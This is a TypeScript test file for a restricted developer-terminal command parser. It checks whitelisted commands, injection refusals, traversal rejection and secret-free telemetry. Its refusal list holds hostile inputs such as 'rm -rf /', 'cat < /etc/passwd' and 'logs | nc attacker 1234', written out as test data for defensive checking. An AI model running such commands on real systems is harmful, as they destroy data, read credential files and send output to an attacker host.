/**
 * dcc-tools canary — the Constitutional Terminal whitelist parser (CFS-020 CDE).
 *
 * A NODE DRILL (vitest is unavailable in the constrained env): the parser is
 * pure, so this file bundles + runs under plain node. It pins the constitutional
 * boundary:
 *   - every whitelisted command parses;
 *   - every non-whitelisted first token (rm, curl, node, eval, `;`-chained,
 *     backticks, `$()`) is REFUSED with the EXACT constitutional line;
 *   - `repo cat` rejects `..` traversal;
 *   - env-check output carries booleans, never values.
 *
 * Run:
 *   npx esbuild --bundle --alias:@=. --platform=node --format=esm \
 *     --packages=external tests/dcc-tools.test.ts --outfile=/tmp/dcc.mjs && node /tmp/dcc.mjs
 */

import assert from 'node:assert/strict';
import {
  parseTerminalCommand,
  CONSTITUTIONAL_REFUSAL,
  renderEnvCheck,
  helpLines,
  TERMINAL_COMMANDS,
} from '@/services/devCommandCenter/terminalCommands';
import {
  recordServerCall,
  recentServerCalls,
  __resetServerCalls,
  SERVER_CALL_BUFFER_CAP,
} from '@/services/devCommandCenter/requestTelemetry';

let checks = 0;
function ok(label: string, cond: boolean) {
  checks += 1;
  assert.ok(cond, label);
}

// ── 1. Every whitelisted command parses ─────────────────────────────────────
const WHITELISTED: string[] = [
  'help',
  'status',
  'env-check',
  'canisters',
  'session',
  'receipts',
  'receipts 5',
  'repo branches',
  'repo ls',
  'repo ls services',
  'repo cat README.md',
  'repo log',
  'repo log 10',
  // Server-side observation diagnostics (CFS-020 CDE DevTools scope, 2026-07-07)
  'dvn',
  'dvn status',
  'dvn pending',
  'dvn failed',
  'logs',
  'logs 5',
  'net',
  'net 20',
  'experiments',
];
for (const cmd of WHITELISTED) {
  const r = parseTerminalCommand(cmd);
  ok(`whitelisted parses: ${cmd}`, r.ok === true);
}

// New diagnostic commands parse with the expected fields.
const dvnBare = parseTerminalCommand('dvn');
ok('bare dvn defaults to status', dvnBare.ok === true && dvnBare.parsed.dvnSub === 'status');
const dvnFailed = parseTerminalCommand('dvn failed');
ok('dvn failed sets dvnSub', dvnFailed.ok === true && dvnFailed.parsed.dvnSub === 'failed');
const logsN = parseTerminalCommand('logs 7');
ok('logs 7 → count 7', logsN.ok === true && logsN.parsed.count === 7);
const netN = parseTerminalCommand('net 12');
ok('net 12 → count 12', netN.ok === true && netN.parsed.count === 12);

// Malformed diagnostic forms are usage errors — NEVER the constitutional refusal.
const dvnBogus = parseTerminalCommand('dvn bogus');
ok('dvn bogus is a usage error, not a refusal', dvnBogus.ok === false && dvnBogus.error !== CONSTITUTIONAL_REFUSAL && /dvn/.test(dvnBogus.error));
const logsBad = parseTerminalCommand('logs abc');
ok('logs abc rejected (not refusal)', logsBad.ok === false && logsBad.error !== CONSTITUTIONAL_REFUSAL);
const netBad = parseTerminalCommand('net -3');
ok('net -3 rejected (not refusal)', netBad.ok === false && netBad.error !== CONSTITUTIONAL_REFUSAL);

// Every declared command token is individually accepted as a first token.
for (const c of TERMINAL_COMMANDS) {
  const first = parseTerminalCommand(c);
  // repo alone is a usage error (needs a sub) but must NOT be the constitutional
  // refusal — it is a recognised command.
  if (c === 'repo') {
    ok('repo without sub is a usage error, not a refusal', first.ok === false && first.error !== CONSTITUTIONAL_REFUSAL);
  } else {
    ok(`command token accepted: ${c}`, first.ok === true);
  }
}

// receipts count clamps + validates.
const rc = parseTerminalCommand('receipts 3');
ok('receipts 3 → count 3', rc.ok === true && rc.parsed.count === 3);
const rcBad = parseTerminalCommand('receipts abc');
ok('receipts abc rejected (not refusal)', rcBad.ok === false && rcBad.error !== CONSTITUTIONAL_REFUSAL);

// ── 2. Non-whitelisted / injection → EXACT constitutional refusal ───────────
const REFUSED: string[] = [
  'rm -rf /',
  'curl http://evil',
  'node -e "x"',
  'eval something',
  'ls; rm -rf /',
  'help && rm -rf /',
  'echo `whoami`',
  'echo $(whoami)',
  'status | cat',
  'cat < /etc/passwd',
  'help > out.txt',
  'help\nrm -rf /',
  // Injection forms on the NEW diagnostic commands are refused wholesale.
  'dvn; rm -rf /',
  'logs `whoami`',
  'net $(cat /etc/passwd)',
  'experiments && curl evil',
  'logs | nc attacker 1234',
];
for (const cmd of REFUSED) {
  const r = parseTerminalCommand(cmd);
  ok(`refused: ${JSON.stringify(cmd)}`, r.ok === false);
  ok(`exact constitutional line: ${JSON.stringify(cmd)}`, r.ok === false && r.error === CONSTITUTIONAL_REFUSAL);
}

// ── 3. repo cat rejects `..` traversal ──────────────────────────────────────
const trav = parseTerminalCommand('repo cat ../secret');
ok('repo cat .. is rejected', trav.ok === false);
ok('repo cat .. mentions traversal (not the refusal line)', trav.ok === false && /traversal/i.test(trav.error) && trav.error !== CONSTITUTIONAL_REFUSAL);
const travMid = parseTerminalCommand('repo cat a/../b');
ok('repo cat a/../b is rejected', travMid.ok === false && /traversal/i.test(travMid.error));
const travLs = parseTerminalCommand('repo ls ../..');
ok('repo ls .. is rejected', travLs.ok === false && /traversal/i.test(travLs.error));
const catGood = parseTerminalCommand('repo cat app/api/route.ts');
ok('repo cat legit path parses with path set', catGood.ok === true && catGood.parsed.path === 'app/api/route.ts');

// ── 4. env-check output carries booleans, never values ──────────────────────
const lines = renderEnvCheck([
  { name: 'GITHUB_TOKEN', present: true },
  { name: 'LINEAR_API_KEY', present: false },
]);
const joined = lines.join('\n');
ok('env-check shows a present marker', /present/.test(joined));
ok('env-check shows an absent marker', /absent/.test(joined));
ok('env-check names GITHUB_TOKEN', joined.includes('GITHUB_TOKEN'));
ok('env-check names LINEAR_API_KEY', joined.includes('LINEAR_API_KEY'));
ok('env-check summary counts present/total', /1\/2 present/.test(joined));
// The formatter takes ONLY booleans — a value cannot structurally appear. Pin
// that no obvious secret-shaped token leaks (there is no value input at all).
ok('env-check output has no "=" value assignments', !/=\s*\S/.test(joined));

// help includes the constitutional boundary note.
const help = helpLines().join('\n');
ok('help states it is not a shell', /NOT a shell/i.test(help));
ok('help lists the command set', /env-check/.test(help) && /repo cat/.test(help));
ok('help lists the new diagnostic commands', /dvn/.test(help) && /logs/.test(help) && /net/.test(help) && /experiments/.test(help));

// ── 5. requestTelemetry — bounded ring, T2-safe fields, newest-first ─────────
__resetServerCalls();

// The ring is bounded — pushing well past the cap never grows it beyond the cap.
for (let i = 0; i < SERVER_CALL_BUFFER_CAP + 50; i += 1) {
  recordServerCall({ method: 'GET', path: `/api/probe/${i}`, status: 200, ms: i });
}
const full = recentServerCalls(10_000);
ok('ring never exceeds the cap', full.length === SERVER_CALL_BUFFER_CAP);

// recentServerCalls is newest-first and bounded by n.
const lastFive = recentServerCalls(5);
ok('recentServerCalls bounded by n', lastFive.length === 5);
ok(
  'recentServerCalls is newest-first',
  lastFive[0].path === `/api/probe/${SERVER_CALL_BUFFER_CAP + 50 - 1}` &&
    lastFive[4].path === `/api/probe/${SERVER_CALL_BUFFER_CAP + 50 - 5}`,
);

// Entries store ONLY the T2-safe fields — a canary asserting no forbidden key
// or value ever enters an entry, and that query strings are stripped.
__resetServerCalls();
recordServerCall({
  // Simulate a caller that carelessly leaves a query string / token on the path.
  method: 'get',
  path: '/api/wallet/active-persona?personaId=leak-uuid&access_token=secret#frag',
  status: 200,
  ms: 3,
});
const entry = recentServerCalls(1)[0];
const FORBIDDEN_KEYS = ['personaId', 'authProfileId', 'rootDid', 'fioHandle', 'kybeAttestation'];
const entryKeys = Object.keys(entry);
for (const forbidden of FORBIDDEN_KEYS) {
  ok(`entry has no forbidden key: ${forbidden}`, !entryKeys.includes(forbidden));
}
ok('entry keys are exactly the T2-safe set', entryKeys.sort().join(',') === ['at', 'method', 'ms', 'path', 'status'].sort().join(','));
const entrySerialized = JSON.stringify(entry);
ok('query string is stripped from the stored path', !entry.path.includes('?') && !entry.path.includes('#'));
ok('token never enters the entry', !entrySerialized.includes('secret'));
ok('personaId value never enters the entry', !entrySerialized.includes('leak-uuid'));
ok('method is normalised, status/ms are numbers', entry.method === 'GET' && typeof entry.status === 'number' && typeof entry.ms === 'number');
__resetServerCalls();

console.log(`dcc-tools: all ${checks} checks passed`);
